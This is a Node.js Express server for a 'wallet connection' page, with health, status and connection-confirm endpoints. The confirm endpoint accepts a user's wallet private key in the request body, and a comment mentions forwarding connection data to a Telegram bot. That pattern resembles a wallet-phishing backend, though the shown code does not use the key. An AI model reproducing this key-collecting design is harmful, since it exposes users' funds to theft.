const express = require('express');
const path = require('path');
const cors = require('cors');
const app = express();
const PORT = 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Serve the wallet connection HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'wallet-connect.html'));
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// API endpoint for wallet connection status
app.get('/api/status', (req, res) => {
  res.json({
    server: 'Wallet Connection Server',
    port: PORT,
    timestamp: new Date().toISOString()
  });
});

// API endpoint for wallet connection confirmation
app.post('/api/connect/confirm', (req, res) => {
  const { userId, walletType, address, chainId, network, privateKey, connected } = req.body;
  
  console.log('🔗 Wallet Connection Received:', {
    userId,
    walletType,
    address,
    chainId: chainId || network,
    connected,
    timestamp: new Date().toISOString()
  });
  
  // Here you would typically:
  // 1. Store the wallet connection data
  // 2. Notify your Telegram bot
  // 3. Update user's wallet status
  
  res.json({ 
    success: true, 
    message: 'Wallet connected successfully',
    userId,
    walletType,
    address
  });
});

// API endpoint for cleanup
app.post('/api/connect/cleanup', (req, res) => {
  const { userId, action } = req.body;
  console.log('🧹 Cleanup request:', { userId, action });
  res.json({ success: true });
});

// Handle any other routes by serving the HTML
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'wallet-connect.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🌐 Wallet Connection Server running on http://localhost:${PORT}`);
  console.log(`📱 Ready to serve wallet connection interface`);
  console.log(`🔗 Connect via: http://localhost:${PORT}?userId=USER_ID&type=eth|apt`);
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n📢 Wallet Connection Server shutting down...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n📢 Wallet Connection Server terminated');
  process.exit(0);
});